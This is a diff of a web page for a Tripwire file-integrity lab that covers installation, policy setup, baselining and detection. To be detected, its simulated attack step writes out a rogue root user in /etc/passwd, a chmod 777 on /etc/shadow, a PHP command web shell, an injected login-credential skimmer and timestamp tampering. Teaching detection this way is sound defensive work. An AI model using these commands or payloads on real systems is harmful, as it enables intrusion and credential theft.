-                                        Get:3 http://archive.ubuntu.com/ubuntu focal-updates InRelease [114 kB]<br>
-                                        [...]<br>
-                                        Reading package lists... Done<br>
-                                        Building dependency tree<br>
-                                        Reading state information... Done<br>
-                                        All packages are up to date.
-                                    </div>
-                                    <div style="margin-top: 15px;">server@ubuntu:~$ <span style="color: #63E2FF;">sudo apt install tripwire</span></div>
-                                    <div style="color: #ABABAB; margin-top: 10px;">
-                                        Reading package lists... Done<br>
-                                        Building dependency tree<br>
-                                        Reading state information... Done<br>
-                                        The following packages will be installed:<br>
-                                          tripwire<br>
-                                        0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.<br>
-                                        Need to get 1,052 kB of archives.<br>
-                                        After this operation, 3,245 kB of additional disk space will be used.<br>
-                                        Get:1 http://archive.ubuntu.com/ubuntu focal/universe amd64 tripwire amd64 2.4.3.7-1 [1,052 kB]<br>
-                                        Fetched 1,052 kB in 2s (526 kB/s)<br>
-                                        <br>
-                                        During installation, you'll be prompted to set up two passphrases:<br>
-                                        - Site Passphrase: used for the Tripwire site configuration file<br>
-                                        - Local Passphrase: used for the Tripwire database<br>
-                                        <br>
-                                        Setting up tripwire (2.4.3.7-1) ...<br>
-                                        <br>
-                                        Creating configuration file /etc/tripwire/twcfg.txt with new version<br>
-                                        Creating configuration file /etc/tripwire/twpol.txt with new version<br>
-                                        <br>
-                                        ----------------------------------------------------------------------<br>
-                                        The Tripwire site and local passphrases are used to<br>
-                                        sign a variety of files, such as the configuration,<br>
-                                        policy, and database files.<br>
-                                        <br>
-                                        Passphrases must be at least 8 characters long.<br>
-                                        <br>
-                                        See the Tripwire manual for more information.<br>
-                                        ----------------------------------------------------------------------<br>
-                                        <br>
-                                        Creating key files...<br>
-                                        <br>
-                                        (When selecting a passphrase, keep in mind that good passphrases typically<br>
-                                        have upper and lower case letters, digits and punctuation marks, and are<br>
-                                        at least 8 characters in length.)<br>
-                                        <br>
-                                        Enter the site keyfile passphrase: <span style="color: #63E2FF;">********</span><br>
-                                        Verify the site keyfile passphrase: <span style="color: #63E2FF;">********</span><br>
-                                        Generating key (this may take several minutes)...Key generation complete.<br>
-                                        <br>
-                                        (When selecting a passphrase, keep in mind that good passphrases typically<br>
-                                        have upper and lower case letters, digits and punctuation marks, and are<br>
-                                        at least 8 characters in length.)<br>
-                                        <br>
-                                        Enter the local keyfile passphrase: <span style="color: #63E2FF;">********</span><br>
-                                        Verify the local keyfile passphrase: <span style="color: #63E2FF;">********</span><br>
-                                        Generating key (this may take several minutes)...Key generation complete.<br>
-                                        <br>
-                                        Generating Tripwire configuration files...<br>
-                                        <br>
-                                        Processing configuration file...<br>
-                                        <br>
-                                        The configuration file:  /etc/tripwire/twcfg.txt<br>
-                                        Wrote configuration file: /etc/tripwire/tw.cfg<br>
-                                        A clear-text version of the Tripwire configuration file has been<br>
-                                        preserved at /etc/tripwire/twcfg.txt.<br>
-                                        <br>
-                                        Processing policy file...<br>
-                                        <br>
-                                        The policy file:  /etc/tripwire/twpol.txt<br>
-                                        Wrote policy file: /etc/tripwire/tw.pol<br>
-                                        A clear-text version of the Tripwire policy file has been preserved at<br>
-                                        /etc/tripwire/twpol.txt.<br>
-                                        <br>
-                                        The Tripwire installation is complete.
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
+                <p>In this phase of the challenge, we'll simulate an attacker making unauthorized changes to our system
+                    and use Tripwire to detect these modifications.</p>
 
-                        <div class="task-item">
-                            <div class="task-number">2</div>
-                            <div class="task-content">
-                                <h4>Review Tripwire Configuration</h4>
-                                <p>Tripwire uses two main configuration files:</p>
-                                <ul style="margin: 10px 0 10px 20px;">
-                                    <li><strong>twcfg.txt</strong>: Contains system-specific settings like file locations and email notification options</li>
-                                    <li><strong>twpol.txt</strong>: Defines which files and directories to monitor and what properties to check</li>
-                                </ul>
-                                <p>Let's examine the default policy file to understand what Tripwire will monitor:</p>
-                                <div class="terminal-header">
-                                    <div class="terminal-controls">
-                                        <span class="terminal-close"></span>
-                                        <span class="terminal-minimize"></span>
-                                        <span class="terminal-maximize"></span>
-                                    </div>
-                                    <span>Terminal</span>
-                                </div>
-                                <div class="terminal">
-                                    <div>server@ubuntu:~$ <span style="color: #63E2FF;">sudo head -n 30 /etc/tripwire/twpol.txt</span></div>
-                                    <div style="color: #ABABAB; margin-top: 10px;">
-                                        ##############################################################################<br>
-                                        #                                                                            #<br>
-                                        # Default Tripwire Policy for Ubuntu                                         #<br>
-                                        #                                                                            #<br>
-                                        ##############################################################################<br>
-                                        <br>
-                                        @@section GLOBAL<br>
-                                        <br>
-                                        TWROOT=/usr/sbin;<br>
-                                        TWBIN=/usr/sbin;<br>
-                                        TWPOL="/etc/tripwire";<br>
-                                        TWDB="/var/lib/tripwire";<br>
-                                        TWSKEY="/etc/tripwire";<br>
-                                        TWLKEY="/etc/tripwire";<br>
-                                        TWREPORT="/var/lib/tripwire/report";<br>
-                                        HOSTNAME=localhost;<br>
-                                        <br>
-                                        @@section FS<br>
-                                        <br>
-                                        # These variables are used to define what properties<br>
-                                        # we will scan for on different file types<br>
-                                        <br>
-                                        # SEC_CRIT     Scans for changes to the file properties:<br>
-                                        #               permissions, owner, group, size, mtime, ctime, inode<br>
-                                        #               links, growing size<br>
-                                        <br>
-                                        # SEC_SUID     Scans for changes to the file properties:<br>
-                                        #               permissions, owner, group, size, mtime, ctime, inode<br>
-                                        #               links, growing size<br>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="task-item">
-                            <div class="task-number">3</div>
-                            <div class="task-content">
-                                <h4>Customize Tripwire Policy</h4>
-                                <p>For this challenge, we'll create a simplified custom policy to monitor specific critical files and directories. Let's create a custom policy file focused on key system areas:</p>
-                                <div class="terminal-header">
-                                    <div class="terminal-controls">
-                                        <span class="terminal-close"></span>
-                                        <span class="terminal-minimize"></span>
-                                        <span class="terminal-maximize"></span>
-                                    </div>
-                                    <span>Terminal</span>
-                                </div>
-                                <div class="terminal">
-                                    <div>server@ubuntu:~$ <span style="color: #63E2FF;">sudo cp /etc/tripwire/twpol.txt /etc/tripwire/twpol.txt.bak</span></div>
-                                    <div>server@ubuntu:~$ <span style="color: #63E2FF;">sudo nano /etc/tripwire/twpol.txt.custom</span></div>
-                                    <div style="color: #ABABAB; margin-top: 10px;">
-                                        # Custom Tripwire Policy File for FIM Challenge<br>
-                                        <br>
-                                        @@section GLOBAL<br>
-                                        <br>
-                                        TWROOT=/usr/sbin;<br>
-                                        TWBIN=/usr/sbin;<br>
-                                        TWPOL="/etc/tripwire";<br>
-                                        TWDB="/var/lib/tripwire";<br>
-                                        TWSKEY="/etc/tripwire";<br>
-                                        TWLKEY="/etc/tripwire";<br>
-                                        TWREPORT="/var/lib/tripwire/report";<br>
-                                        HOSTNAME=localhost;<br>
-                                        <br>
-                                        @@section FS<br>
-                                        <br>
-                                        # File property masks<br>
-                                        SEC_CRIT      = $(PN) $(PX) $(PALL) -SHa ; # Critical files<br>
-                                        SEC_BIN       = $(PN) $(PX) $(PALL) -SHa ; # Binaries<br>
-                                        SEC_CONFIG    = $(PN) $(PX) $(PALL) -SHa ; # Config files<br>
-                                        SEC_LOG       = $(PN) $(PX) $(PALL) -SHa ; # Log files<br>
-                                        SIG_LOW       = 33 ;                       # Non-critical files<br>
-                                        SIG_MED       = 66 ;                       # User binaries<br>
-                                        SIG_HI        = 100 ;                      # Critical files<br>
-                                        <br>
-                                        @@section POLICY<br>
-                                        <br>
-                                        # Critical system binaries<br>
-                                        {<br>
-                                          /bin                    -> $(SEC_BIN) (recurse=true) ;<br>
-                                          /sbin                   -> $(SEC_BIN) (recurse=true) ;<br>
-                                          /usr/bin                -> $(SEC_BIN) (recurse=true) ;<br>
-                                          /usr/sbin               -> $(SEC_BIN) (recurse=true) ;<br>
-                                        }<br>
-                                        <br>
-                                        # Critical system configuration<br>
-                                        {<br>
-                                          /etc                    -> $(SEC_CONFIG) (recurse=false) ;<br>
-                                          /etc/passwd             -> $(SEC_CRIT) ;<br>
-                                          /etc/shadow             -> $(SEC_CRIT) ;<br>
-                                          /etc/group              -> $(SEC_CRIT) ;<br>
-                                          /etc/ssh                -> $(SEC_CONFIG) (recurse=true) ;<br>
-                                          /etc/tripwire           -> $(SEC_CONFIG) (recurse=true) ;<br>
-                                        }<br>
-                                        <br>
-                                        # Web server files (for the challenge)<br>
-                                        {<br>
-                                          /var/www/html           -> $(SEC_CONFIG) (recurse=true) ;<br>
-                                        }<br>
-                                    </div>
-                                    <div style="margin-top: 15px;">server@ubuntu:~$ <span style="color: #63E2FF;">sudo cp /etc/tripwire/twpol.txt.custom /etc/tripwire/twpol.txt</span></div>
-                                    <div style="margin-top: 15px;">server@ubuntu:~$ <span style="color: #63E2FF;">sudo tripwire --update-policy /etc/tripwire/twpol.txt</span></div>
-                                    <div style="color: #ABABAB; margin-top: 10px;">
-                                        Enter your local passphrase: <span style="color: #63E2FF;">********</span><br>
-                                        Parsing policy file: /etc/tripwire/twpol.txt<br>
-                                        Generating signed policy file: /etc/tripwire/tw.pol<br>
-                                        <br>
-                                        Please enter your site passphrase: <span style="color: #63E2FF;">********</span><br>
-                                        <br>
-                                        Wrote policy file: /etc/tripwire/tw.pol<br>
-                                        Policy update complete.
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-
-                    <div class="command-help">
-                        <h4><i class="fas fa-terminal"></i> Key Tripwire Commands</h4>
-                        <div class="command-item">
-                            <span class="command-name">tripwire --init</span>
-                            <p>Initializes the Tripwire database by creating a baseline of the monitored files according to the policy</p>
-                        </div>
-                        <div class="command-item">
-                            <span class="command-name">tripwire --check</span>
-                            <p>Checks the current state of monitored files against the baseline and generates a report of any changes</p>
-                        </div>
-                        <div class="command-item">
-                            <span class="command-name">tripwire --update-policy [policy_file]</span>
-                            <p>Updates the Tripwire policy with changes from the specified text policy file</p>
-                        </div>
-                        <div class="command-item">
-                            <span class="command-name">tripwire --update --twrfile [report_file]</span>
-                            <p>Updates the Tripwire database with changes found in the specified report file (used to acknowledge legitimate changes)</p>
-                        </div>
-                    </div>
-
-                    <div style="margin-top: 30px; text-align: center;">
-                        <button class="btn btn-primary" onclick="completeSetup()">Complete Setup</button>
-                    </div>
+                <div class="warning-box">
+                    <h4><i class="fas fa-exclamation-triangle"></i> Scenario</h4>
+                    <p>Your company's web server has been targeted by an attacker who has gained access to the system.
+                        They have made several changes to critical files in an attempt to establish persistence and
+                        potentially extract sensitive information.</p>
+                    <p>As the security analyst, you need to run a Tripwire integrity check to identify what files have
+                        been modified.</p>
                 </div>
 
-                <!-- Creating Baseline Tab -->
-                <div class="challenge-container" id="baseline">
-                    <h3 style="margin-bottom: 20px;">Creating the Integrity Baseline</h3>
-
-                    <p>Now that we've installed and configured Tripwire, we need to create a baseline of our system's files. This baseline will serve as the "known good state" against which future file states will be compared.</p>
-
-                    <div class="task-list">
-                        <div class="task-item">
-                            <div class="task-number">1</div>
-                            <div class="task-content">
-                                <h4>Initialize the Tripwire Database</h4>
-                                <p>Let's create the initial baseline database using our custom policy:</p>
-                                <div class="terminal-header">
-                                    <div class="terminal-controls">
-                                        <span class="terminal-close"></span>
-                                        <span class="terminal-minimize"></span>
-                                        <span class="terminal-maximize"></span>
-                                    </div>
-                                    <span>Terminal</span>
+                <div class="task-list">
+                    <div class="task-item">
+                        <div class="task-number">1</div>
+                        <div class="task-content">
+                            <h4>Simulate Unauthorized Changes</h4>
+                            <p>For the purpose of this challenge, we'll simulate an attacker making several changes to
+                                our system:</p>
+                            <div class="terminal-header">
+                                <div class="terminal-controls">
+                                    <span class="terminal-close"></span>
+                                    <span class="terminal-minimize"></span>
+                                    <span class="terminal-maximize"></span>
                                 </div>
-                                <div class="terminal">
-                                    <div>server@ubuntu:~$ <span style="color: #63E2FF;">sudo tripwire --init</span></div>
-                                    <div style="color: #ABABAB; margin-top: 10px;">
-                                        Please enter your local passphrase: <span style="color: #63E2FF;">********</span><br>
-                                        <br>
-                                        Parsing policy file: /etc/tripwire/tw.pol<br>
-                                        Generating the database...<br>
-                                        *** Processing Unix File System ***<br>
-                                        <br>
-                                        ### Phase 1:   Reading configuration files<br>
-                                        ### Phase 2:   Generating file list<br>
-                                        ### Phase 3:   Creating file information database<br>
-                                        ### Phase 4:   Searching for invariant files<br>
-                                        ### Phase 5:   Pruning unneeded file information<br>
-                                        ### Phase 6:   Calculating file hashes<br>
-                                        ### Phase 7:   Storing database<br>
-                                        <br>
-                                        Wrote database file: /var/lib/tripwire/localhost.twd<br>
-                                        <br>
-                                        The database was successfully generated.
-                                    </div>
-                                </div>
+                                <span>Terminal</span>
                             </div>
-                        </div>
-
-                        <div class="task-item">
-                            <div class="task-number">2</div>
-                            <div class="task-content">
-                                <h4>Verify the Initial Database</h4>
-                                <p>Let's run a check immediately after creating the baseline to make sure everything is working correctly:</p>
-                                <div class="terminal-header">
-                                    <div class="terminal-controls">
-                                        <span class="terminal-close"></span>
-                                        <span class="terminal-minimize"></span>
-                                        <span class="terminal-maximize"></span>
-                                    </div>
-                                    <span>Terminal</span>
+                            <div class="terminal">
+                                <div>server@ubuntu:~$ <span
+                                        style="color: #63E2FF;"># Simulating unauthorized changes</span></div>
+                                <div style="margin-top: 15px;">server@ubuntu:~$ <span style="color: #63E2FF;">sudo bash -c "echo 'malicious_user:x:0:0:Malicious User:/home/malicious_user:/bin/bash' >> /etc/passwd"</span>
                                 </div>
-                                <div class="terminal">
-                                    <div>server@ubuntu:~$ <span style="color: #63E2FF;">sudo tripwire --check</span></div>
-                                    <div style="color: #ABABAB; margin-top: 10px;">
-                                        Please enter your local passphrase: <span style="color: #63E2FF;">********</span><br>
-                                        <br>
-                                        Parsing policy file: /etc/tripwire/tw.pol<br>
-                                        *** Processing Unix File System ***<br>
-                                        <br>
-                                        ### Phase 1:   Reading configuration files<br>
-                                        ### Phase 2:   Generating file list<br>
-                                        ### Phase 3:   Creating file information database<br>
-                                        ### Phase 4:   Searching for invariant files<br>
-                                        ### Phase 5:   Pruning unneeded file information<br>
-                                        ### Phase 6:   Calculating file hashes<br>
-                                        ### Phase 7:   Comparing database against system<br>
-                                        <br>
-                                        No violations were found. Report generated at:<br>
-                                        /var/lib/tripwire/report/localhost-20250401-121530.twr<br>
-                                    </div>
+                                <div style="margin-top: 15px;">server@ubuntu:~$ <span style="color: #63E2FF;">sudo chmod 777 /etc/shadow</span>
                                 </div>
-                                <p style="margin-top: 15px;">Perfect! There are no violations reported because we just created the baseline. This means Tripwire is successfully monitoring our files according to the policy we defined.</p>
-                            </div>
-                        </div>
-
-                        <div class="task-item">
-                            <div class="task-number">3</div>
-                            <div class="task-content">
-                                <h4>Understand What's Being Monitored</h4>
-                                <p>Let's examine what files are being monitored in more detail. We'll look at a key area defined in our policy - the web server files:</p>
-                                <div class="terminal-header">
-                                    <div class="terminal-controls">
-                                        <span class="terminal-close"></span>
-                                        <span class="terminal-minimize"></span>
-                                        <span class="terminal-maximize"></span>
-                                    </div>
-                                    <span>Terminal</span>
-                                </div>
-                                <div class="terminal">
-                                    <div>server@ubuntu:~$ <span style="color: #63E2FF;">ls -la /var/www/html/</span></div>
-                                    <div style="color: #ABABAB; margin-top: 10px;">
-                                        total 28<br>
-                                        drwxr-xr-x 2 www-data www-data 4096 Apr  1 11:30 .<br>
-                                        drwxr-xr-x 3 root     root     4096 Apr  1 11:25 ..<br>
-                                        -rw-r--r-- 1 www-data www-data 9172 Apr  1 11:30 index.html<br>
-                                        -rw-r--r-- 1 www-data www-data 2874 Apr  1 11:30 login.php<br>
-                                        -rw-r--r-- 1 www-data www-data 1507 Apr  1 11:30 styles.css<br>
-                                    </div>
-                                    <div style="margin-top: 15px;">server@ubuntu:~$ <span style="color: #63E2FF;">cat /var/www/html/index.html | head -10</span></div>
-                                    <div style="color: #ABABAB; margin-top: 10px;">
-                                        &lt;!DOCTYPE html&gt;<br>
-                                        &lt;html lang="en"&gt;<br>
-                                        &lt;head&gt;<br>
-                                        &lt;meta charset="UTF-8"&gt;<br>
-                                        &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;<br>
-                                        &lt;title&gt;Company Internal Portal&lt;/title&gt;<br>
-                                        &lt;link rel="stylesheet" href="styles.css"&gt;<br>
-                                        &lt;/head&gt;<br>
-                                        &lt;body&gt;<br>
-                                        &lt;header&gt;<br>
-                                    </div>
-                                </div>
-                                <p style="margin-top: 15px;">These are the web server files that Tripwire is monitoring. Any changes to these files will be detected during the integrity check.</p>
-                            </div>
-                        </div>
-                    </div>
-
-                    <div class="info-box">
-                        <h4><i class="fas fa-info-circle"></i> What Tripwire Monitors</h4>
-                        <p>Tripwire can monitor various file properties including:</p>
-                        <ul style="margin-top: 10px; margin-left: 20px;">
-                            <li><strong>File Content</strong>: Detected through cryptographic hash changes (MD5, SHA-1)</li>
-                            <li><strong>Permissions</strong>: File access rights (read, write, execute)</li>
-                            <li><strong>Ownership</strong>: User and group ownership of files</li>
-                            <li><strong>Size</strong>: File size in bytes</li>
-                            <li><strong>Timestamps</strong>: Modification time (mtime), access time (atime), and creation time (ctime)</li>
-                            <li><strong>Inode</strong>: The file's reference number in the filesystem</li>
-                            <li><strong>Link Count</strong>: Number of hard links to the file</li>
-                        </ul>
-                        <p style="margin-top: 10px;">By monitoring these properties, Tripwire can detect various types of unauthorized changes, including content modifications, permission changes, and ownership transfers.</p>
-                    </div>
-
-                    <div style="margin-top: 30px; text-align: center;">
-                        <button class="btn btn-primary" onclick="completeBaseline()">Complete Baseline Creation</button>
-                    </div>
-                </div>
-
-                <!-- Change Detection Tab -->
-                <div class="challenge-container" id="detection">
-                    <h3 style="margin-bottom: 20px;">Detecting Unauthorized Changes</h3>
-
-                    <p>In this phase of the challenge, we'll simulate an attacker making unauthorized changes to our system and use Tripwire to detect these modifications.</p>
-
-                    <div class="warning-box">
-                        <h4><i class="fas fa-exclamation-triangle"></i> Scenario</h4>
-                        <p>Your company's web server has been targeted by an attacker who has gained access to the system. They have made several changes to critical files in an attempt to establish persistence and potentially extract sensitive information.</p>
-                        <p>As the security analyst, you need to run a Tripwire integrity check to identify what files have been modified.</p>
-                    </div>
-
-                    <div class="task-list">
-                        <div class="task-item">
-                            <div class="task-number">1</div>
-                            <div class="task-content">
-                                <h4>Simulate Unauthorized Changes</h4>
-                                <p>For the purpose of this challenge, we'll simulate an attacker making several changes to our system:</p>
-                                <div class="terminal-header">
-                                    <div class="terminal-controls">
-                                        <span class="terminal-close"></span>
-                                        <span class="terminal-minimize"></span>
-                                        <span class="terminal-maximize"></span>
-                                    </div>
-                                    <span>Terminal</span>
-                                </div>
-                                <div class="terminal">
-                                    <div>server@ubuntu:~$ <span style="color: #63E2FF;"># Simulating unauthorized changes</span></div>
-                                    <div style="margin-top: 15px;">server@ubuntu:~$ <span style="color: #63E2FF;">sudo bash -c "echo 'malicious_user:x:0:0:Malicious User:/home/malicious_user:/bin/bash' >> /etc/passwd"</span></div>
-                                    <div style="margin-top: 15px;">server@ubuntu:~$ <span style="color: #63E2FF;">sudo chmod 777 /etc/shadow</span></div>
-                                    <div style="margin-top: 15px;">server@ubuntu:~$ <span style="color: #63E2FF;">sudo bash -c "cat > /var/www/html/backdoor.php << 'EOL'
-<?php
+                                <div style="margin-top: 15px;">server@ubuntu:~$ <span style="color: #63E2FF;">sudo bash -c "cat > /var/www/html/backdoor.php << 'EOL'
+                                    <?php
 if(isset(\$_REQUEST['cmd'])) {
     echo '<pre>';
     \$cmd = (\$_REQUEST['cmd']);
@@ -584,11 +647,11 @@ if(isset(\$_REQUEST['cmd'])) {
 }
 ?>
 EOL"</span></div>
-                                    <div style="margin-top: 15px;">server@ubuntu:~$ <span style="color: #63E2FF;">sudo cat >> /var/www/html/index.html << 'EOL'
+                                <div style="margin-top: 15px;">server@ubuntu:~$ <span style="color: #63E2FF;">sudo cat >> /var/www/html/index.html << 'EOL'
 <script>
-document.addEventListener('DOMContentLoaded', function() {
+document.addEventListener('DOMContentLoaded', function () {
     // Hidden code to steal login credentials
-    document.querySelector('form').addEventListener('submit', function(e) {
+    document.querySelector('form').addEventListener('submit', function (e) {
         var username = document.getElementById('username').value;
         var password = document.getElementById('password').value;
         var img = new Image();
@@ -597,511 +660,556 @@ document.addEventListener('DOMContentLoaded', function() {
 });
 </script>
 EOL</span></div>
-                                    <div style="margin-top: 15px;">server@ubuntu:~$ <span style="color: #63E2FF;">sudo touch -a -m -t 202504010800 /var/www/html/backdoor.php</span></div>
-                                </div>
-                                <p style="margin-top: 15px;">The attacker has made the following changes:</p>
-                                <ol style="margin-top: 10px; margin-left: 20px;">
-                                    <li>Added a new root-level user to /etc/passwd (privilege escalation)</li>
-                                    <li>Changed permissions on /etc/shadow to world-readable (exposing password hashes)</li>
-                                    <li>Added a backdoor PHP script to the web directory (remote code execution)</li>
-                                    <li>Modified index.html to include a JavaScript keylogger (credential theft)</li>
-                                    <li>Attempted to hide the backdoor by changing its timestamp</li>
-                                </ol>
-                            </div>
-                        </div>
-
-                        <div class="task-item">
-                            <div class="task-number">2</div>
-                            <div class="task-content">
-                                <h4>Run Tripwire Check to Detect Changes</h4>
-                                <p>Now let's run Tripwire to detect these unauthorized changes:</p>
-                                <div class="terminal-header">
-                                    <div class="terminal-controls">
-                                        <span class="terminal-close"></span>
-                                        <span class="terminal-minimize"></span>
-                                        <span class="terminal-maximize"></span>
-                                    </div>
-                                    <span>Terminal</span>
-                                </div>
-                                <div class="terminal">
-                                    <div>server@ubuntu:~$ <span style="color: #63E2FF;">sudo tripwire --check</span></div>
-                                    <div style="color: #ABABAB; margin-top: 10px;">
-                                        Please enter your local passphrase: <span style="color: #63E2FF;">********</span><br>
-                                        <br>
-                                        Parsing policy file: /etc/tripwire/tw.pol<br>
-                                        *** Processing Unix File System ***<br>
-                                        <br>
-                                        ### Phase 1:   Reading configuration files<br>
-                                        ### Phase 2:   Generating file list<br>
-                                        ### Phase 3:   Creating file information database<br>
-                                        ### Phase 4:   Searching for invariant files<br>
-                                        ### Phase 5:   Pruning unneeded file information<br>
-                                        ### Phase 6:   Calculating file hashes<br>
-                                        ### Phase 7:   Comparing database against system<br>
-                                        <br>
-                                        ===============================================================================<br>
-                                        Object name:  /etc/passwd<br>
-                                        Property:     Modified Object<br>
-                                        <br>
-                                        Expected:  1  1043  100644  root  root  4925  1617234567<br>
-                                        Observed:  1  1044  100644  root  root  5015  1617284987<br>
-                                        <br>
-                                        ===============================================================================<br>
-                                        Object name:  /etc/shadow<br>
-                                        Property:     Modified Object<br>
-                                        <br>
-                                        Expected:  1  1177  100640  root  shadow  1673  1617234567<br>
-                                        Observed:  1  1177  100777  root  shadow  1673  1617284987<br>
-                                        <br>
-                                        ===============================================================================<br>
-                                        Object name:  /var/www/html<br>
-                                        Property:     Added: "/var/www/html/backdoor.php"<br>
-                                        <br>
-                                        ===============================================================================<br>
-                                        Object name:  /var/www/html/index.html<br>
-                                        Property:     Modified Object<br>
-                                        <br>
-                                        Expected:  1  1207  100644  www-data  www-data  9172  1617234567<br>
-                                        Observed:  1  1406  100644  www-data  www-data  9632  1617284987<br>
-                                        <br>
-                                        ===============================================================================<br>
-                                        <br>
-                                        Total objects scanned:  1548<br>
-                                        Total violations found:  4<br>
-                                        <br>
-                                        Report generated at:  /var/lib/tripwire/report/localhost-20250402-134522.twr<br>
-                                    </div>
-                                </div>
-                                <p style="margin-top: 15px;">Tripwire has successfully detected all the unauthorized changes!</p>
-                            </div>
-                        </div>
-
-                        <div class="task-item">
-                            <div class="task-number">3</div>
-                            <div class="task-content">
-                                <h4>Generate a Detailed Report</h4>
-                                <p>Let's generate a more detailed report to better understand the changes:</p>
-                                <div class="terminal-header">
-                                    <div class="terminal-controls">
-                                        <span class="terminal-close"></span>
-                                        <span class="terminal-minimize"></span>
-                                        <span class="terminal-maximize"></span>
-                                    </div>
-                                    <span>Terminal</span>
-                                </div>
-                                <div class="terminal">
-                                    <div>server@ubuntu:~$ <span style="color: #63E2FF;">sudo twprint --twrfile /var/lib/tripwire/report/localhost-20250402-134522.twr --report-level 3</span></div>
-                                    <div style="color: #ABABAB; margin-top: 10px;">
-                                        Tripwire(R) 2.4.3.7 Integrity Check Report<br>
-                                        <br>
-                                        Report generated by:          root<br>
-                                        Report created on:            Wed Apr  2 13:45:22 2025<br>
-                                        Database last updated on:     Wed Apr  1 12:15:30 2025<br>
-                                        <br>
-                                        ===============================================================================<br>
-                                        Rule Summary:<br>
-                                        -------------------------------------------------------------------------------<br>
-                                        Section: Unix File System<br>
-                                        <br>
-                                        Rule Name                       Severity Level    Added    Removed    Modified<br>
-                                        -------------------------------------------------------------------------------<br>
-                                        Critical system configuration      100            0        0          2<br>
-                                        Web server files                   100            1        0          1<br>
-                                        <br>
-                                        ===============================================================================<br>
-                                        Object Summary:<br>
-                                        -------------------------------------------------------------------------------<br>
-                                        # Section: Unix File System<br>
-                                        <br>
-                                        Added Objects: 1<br>
-                                        -------------------------------------------------------------------------------<br>
-                                        1. /var/www/html/backdoor.php<br>
-                                        <br>
-                                        <br>
-                                        Modified Objects: 3<br>
-                                        -------------------------------------------------------------------------------<br>
-                                        1. /etc/passwd<br>
-                                        Observed:  Size, Modify time<br>
-                                        <br>
-                                        2. /etc/shadow<br>
-                                        Observed:  Mode, Modify time<br>
-                                        <br>
-                                        3. /var/www/html/index.html<br>
-                                        Observed:  Size, Modify time<br>
-                                        <br>
-                                        ===============================================================================<br>
-                                        Object Details:<br>
-                                        -------------------------------------------------------------------------------<br>
-                                        <br>
-                                        #1: Object name:  /etc/passwd<br>
-                                        Property:     Modified Object<br>
-                                        <br>
-                                        Property:     Size<br>
-                                        Expected:     4925<br>
-                                        Observed:     5015<br>
-                                        <br>
-                                        Property:     Modify Time<br>
-                                        Expected:     Thu Apr  1 12:02:47 2025<br>
-                                        Observed:     Fri Apr  2 13:36:27 2025<br>
-                                        <br>
-                                        #2: Object name:  /etc/shadow<br>
-                                        Property:     Modified Object<br>
-                                        <br>
-                                        Property:     Mode<br>
-                                        Expected:     -rw-r-----<br>
-                                        Observed:     -rwxrwxrwx<br>
-                                        <br>
-                                        Property:     Modify Time<br>
-                                        Expected:     Thu Apr  1 12:02:47 2025<br>
-                                        Observed:     Fri Apr  2 13:37:08 2025<br>
-                                        <br>
-                                        #3: Object name:  /var/www/html<br>
-                                        Property:     Added: "/var/www/html/backdoor.php"<br>
-                                        <br>
-                                        #4: Object name:  /var/www/html/index.html<br>
-                                        Property:     Modified Object<br>
-                                        <br>
-                                        Property:     Size<br>
-                                        Expected:     9172<br>
-                                        Observed:     9632<br>
-                                        <br>
-                                        Property:     Modify Time<br>
-                                        Expected:     Thu Apr  1 11:30:00 2025<br>
-                                        Observed:     Fri Apr  2 13:38:47 2025<br>
-                                        <br>
-                                        ===============================================================================<br>
-                                        Error Report:<br>
-                                        -------------------------------------------------------------------------------<br>
-                                        No Errors<br>
-                                        <br>
-                                        ===============================================================================<br>
-                                    </div>
+                                <div style="margin-top: 15px;">server@ubuntu:~$ <span style="color: #63E2FF;">sudo touch -a -m -t 202504010800 /var/www/html/backdoor.php</span>
                                 </div>
                             </div>
+                            <p style="margin-top: 15px;">The attacker has made the following changes:</p>
+                            <ol style="margin-top: 10px; margin-left: 20px;">
+                                <li>Added a new root-level user to /etc/passwd (privilege escalation)</li>
+                                <li>Changed permissions on /etc/shadow to world-readable (exposing password hashes)</li>
+                                <li>Added a backdoor PHP script to the web directory (remote code execution)</li>
+                                <li>Modified index.html to include a JavaScript keylogger (credential theft)</li>
+                                <li>Attempted to hide the backdoor by changing its timestamp</li>
+                            </ol>
                         </div>
                     </div>
 
-                    <div class="file-grid">
-                        <div class="file-item modified" onclick="showFileDetails('passwd')">
-                            <i class="fas fa-file-alt"></i>
-                            <span>/etc/passwd</span>
-                        </div>
-                        <div class="file-item modified" onclick="showFileDetails('shadow')">
-                            <i class="fas fa-file-shield"></i>
-                            <span>/etc/shadow</span>
-                        </div>
-                        <div class="file-item modified" onclick="showFileDetails('backdoor')">
-                            <i class="fas fa-file-code"></i>
-                            <span>backdoor.php</span>
-                        </div>
-                        <div class="file-item modified" onclick="showFileDetails('index')">
-                            <i class="fas fa-file-code"></i>
-                            <span>index.html</span>
+                    <div class="task-item">
+                        <div class="task-number">2</div>
+                        <div class="task-content">
+                            <h4>Run Tripwire Check to Detect Changes</h4>
+                            <p>Now let's run Tripwire to detect these unauthorized changes:</p>
+                            <div class="terminal-header">
+                                <div class="terminal-controls">
+                                    <span class="terminal-close"></span>
+                                    <span class="terminal-minimize"></span>
+                                    <span class="terminal-maximize"></span>
+                                </div>
+                                <span>Terminal</span>
+                            </div>
+                            <div class="terminal">
+                                <div>server@ubuntu:~$ <span style="color: #63E2FF;">sudo tripwire --check</span></div>
+                                <div style="color: #ABABAB; margin-top: 10px;">
+                                    Please enter your local passphrase: <span
+                                        style="color: #63E2FF;">********</span><br>
+                                    <br>
+                                    Parsing policy file: /etc/tripwire/tw.pol<br>
+                                    *** Processing Unix File System ***<br>
+                                    <br>
+                                    ### Phase 1: Reading configuration files<br>
+                                    ### Phase 2: Generating file list<br>
+                                    ### Phase 3: Creating file information database<br>
+                                    ### Phase 4: Searching for invariant files<br>
+                                    ### Phase 5: Pruning unneeded file information<br>
+                                    ### Phase 6: Calculating file hashes<br>
+                                    ### Phase 7: Comparing database against system<br>
+                                    <br>
+                                    ===============================================================================<br>
+                                    Object name: /etc/passwd<br>
+                                    Property: Modified Object<br>
+                                    <br>
+                                    Expected: 1 1043 100644 root root 4925 1617234567<br>
+                                    Observed: 1 1044 100644 root root 5015 1617284987<br>
+                                    <br>
+                                    ===============================================================================<br>
+                                    Object name: /etc/shadow<br>
+                                    Property: Modified Object<br>
+                                    <br>
